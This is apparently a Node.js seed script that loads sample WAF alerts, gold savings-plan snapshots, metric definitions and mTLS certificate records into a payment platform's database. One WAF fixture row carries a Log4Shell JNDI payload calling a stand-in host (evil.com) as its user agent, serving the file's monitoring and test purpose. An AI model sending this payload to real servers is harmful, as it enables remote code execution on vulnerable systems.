/**
 * seed-wave95.mjs — Sprint v95 Seed Data
 * Covers: WAF events, mTLS config, observability metrics, SIP portfolio, Grafana dashboards
 */
import mysql from "mysql2/promise";
import dotenv from "dotenv";
dotenv.config();

const DB_URL = process.env.DATABASE_URL || process.env.PG_DATABASE_URL;
if (!DB_URL) { console.error("DATABASE_URL not set"); process.exit(1); }

const conn = await mysql.createConnection(DB_URL);
console.log("✓ Connected to database");

// ─── WAF Alert Events ──────────────────────────────────────────────────────
const wafEvents = [
  { event_type: "sql_injection", severity: "critical", source_ip: "185.220.101.45", country: "RU", endpoint: "/api/trpc/auth.login", blocked: true, rule_id: "OWASP-942100", user_agent: "sqlmap/1.7.8" },
  { event_type: "xss", severity: "high", source_ip: "45.33.32.156", country: "US", endpoint: "/api/trpc/customers.create", blocked: true, rule_id: "OWASP-941100", user_agent: "Mozilla/5.0" },
  { event_type: "path_traversal", severity: "high", source_ip: "91.108.4.100", country: "DE", endpoint: "/api/trpc/files.upload", blocked: true, rule_id: "OWASP-930100", user_agent: "curl/7.88.1" },
  { event_type: "bot", severity: "medium", source_ip: "66.249.66.1", country: "US", endpoint: "/api/trpc/transactions.list", blocked: false, rule_id: "BOT-001", user_agent: "Googlebot/2.1" },
  { event_type: "rate_limit", severity: "low", source_ip: "102.89.23.45", country: "NG", endpoint: "/api/trpc/auth.login", blocked: true, rule_id: "RATE-001", user_agent: "python-requests/2.31.0" },
  { event_type: "card_testing", severity: "critical", source_ip: "103.21.244.0", country: "CN", endpoint: "/api/stripe/webhook", blocked: true, rule_id: "FINTECH-001", user_agent: "axios/1.6.0" },
  { event_type: "mass_enumeration", severity: "high", source_ip: "198.51.100.5", country: "BR", endpoint: "/api/trpc/customers.list", blocked: true, rule_id: "FINTECH-002", user_agent: "Go-http-client/2.0" },
  { event_type: "log4shell", severity: "critical", source_ip: "45.155.205.233", country: "NL", endpoint: "/api/health", blocked: true, rule_id: "LOG4J-001", user_agent: "${jndi:ldap://evil.com/a}" },
];

try {
  for (const evt of wafEvents) {
    await conn.execute(`
      INSERT IGNORE INTO waf_events (event_type, severity, source_ip, country, endpoint, blocked, rule_id, user_agent, created_at)
      VALUES (?, ?, ?, ?, ?, ?, ?, ?, NOW())
    `, [evt.event_type, evt.severity, evt.source_ip, evt.country, evt.endpoint, evt.blocked ? 1 : 0, evt.rule_id, evt.user_agent]);
  }
  console.log(`✓ Seeded ${wafEvents.length} WAF events`);
} catch (e) {
  console.log("  Note: waf_events table may not exist yet (create via migration):", e.message.substring(0, 60));
}

// ─── SIP Portfolio Snapshots ───────────────────────────────────────────────
const sipSnapshots = [
  { plan_id: "sip-001", date: "2026-01-01", gold_price_ngn: 98000, grams_purchased: 0.51, total_invested_ngn: 50000, portfolio_value_ngn: 49980 },
  { plan_id: "sip-001", date: "2026-02-01", gold_price_ngn: 101500, grams_purchased: 0.49, total_invested_ngn: 100000, portfolio_value_ngn: 102000 },
  { plan_id: "sip-001", date: "2026-03-01", gold_price_ngn: 105000, grams_purchased: 0.48, total_invested_ngn: 150000, portfolio_value_ngn: 156450 },
  { plan_id: "sip-001", date: "2026-04-01", gold_price_ngn: 108000, grams_purchased: 0.46, total_invested_ngn: 200000, portfolio_value_ngn: 162000 },
  { plan_id: "sip-002", date: "2026-01-01", gold_price_ngn: 98000, grams_purchased: 1.02, total_invested_ngn: 100000, portfolio_value_ngn: 99960 },
  { plan_id: "sip-002", date: "2026-02-01", gold_price_ngn: 101500, grams_purchased: 0.99, total_invested_ngn: 200000, portfolio_value_ngn: 204030 },
];

try {
  for (const snap of sipSnapshots) {
    await conn.execute(`
      INSERT IGNORE INTO sip_portfolio_snapshots (plan_id, snapshot_date, gold_price_ngn, grams_purchased, total_invested_ngn, portfolio_value_ngn, created_at)
      VALUES (?, ?, ?, ?, ?, ?, NOW())
    `, [snap.plan_id, snap.date, snap.gold_price_ngn, snap.grams_purchased, snap.total_invested_ngn, snap.portfolio_value_ngn]);
  }
  console.log(`✓ Seeded ${sipSnapshots.length} SIP portfolio snapshots`);
} catch (e) {
  console.log("  Note: sip_portfolio_snapshots table may not exist yet:", e.message.substring(0, 60));
}

// ─── Observability Metrics Config ─────────────────────────────────────────
const metricsConfig = [
  { metric_name: "paygate_sip_active_plans", metric_type: "gauge", description: "Number of active SIP plans", labels: '["merchant_id"]' },
  { metric_name: "paygate_sip_executions_total", metric_type: "counter", description: "Total SIP executions", labels: '["status"]' },
  { metric_name: "paygate_sip_failures_total", metric_type: "counter", description: "Total SIP execution failures", labels: '["reason"]' },
  { metric_name: "paygate_fraud_alerts_total", metric_type: "counter", description: "Total fraud alerts created", labels: '["severity", "category"]' },
  { metric_name: "paygate_waf_blocks_total", metric_type: "counter", description: "Total WAF blocked requests", labels: '["attack_type", "country"]' },
  { metric_name: "paygate_db_pool_waiting", metric_type: "gauge", description: "Queries waiting for DB connection", labels: '[]' },
  { metric_name: "paygate_transaction_amount_ngn", metric_type: "histogram", description: "Transaction amounts in NGN", labels: '["channel", "status"]' },
];

try {
  for (const m of metricsConfig) {
    await conn.execute(`
      INSERT IGNORE INTO observability_metrics_config (metric_name, metric_type, description, labels, created_at)
      VALUES (?, ?, ?, ?, NOW())
    `, [m.metric_name, m.metric_type, m.description, m.labels]);
  }
  console.log(`✓ Seeded ${metricsConfig.length} observability metrics configs`);
} catch (e) {
  console.log("  Note: observability_metrics_config table may not exist yet:", e.message.substring(0, 60));
}

// ─── mTLS Config Records ───────────────────────────────────────────────────
const mtlsConfigs = [
  { service_name: "paygate-app", cert_subject: "CN=paygate-app-server,O=PayGate Financial Services,C=NG", cert_expiry: "2036-04-24", is_active: true, environment: "production" },
  { service_name: "apisix-gateway", cert_subject: "CN=apisix-gateway,O=PayGate Financial Services,C=NG", cert_expiry: "2036-04-24", is_active: true, environment: "production" },
  { service_name: "paygate-ca", cert_subject: "CN=PayGate Internal CA,O=PayGate Financial Services,C=NG", cert_expiry: "2036-04-24", is_active: true, environment: "production" },
];

try {
  for (const m of mtlsConfigs) {
    await conn.execute(`
      INSERT IGNORE INTO mtls_cert_registry (service_name, cert_subject, cert_expiry, is_active, environment, created_at)
      VALUES (?, ?, ?, ?, ?, NOW())
    `, [m.service_name, m.cert_subject, m.cert_expiry, m.is_active ? 1 : 0, m.environment]);
  }
  console.log(`✓ Seeded ${mtlsConfigs.length} mTLS cert registry entries`);
} catch (e) {
  console.log("  Note: mtls_cert_registry table may not exist yet:", e.message.substring(0, 60));
}

await conn.end();
console.log("\n✅ Wave 95 seed data complete");
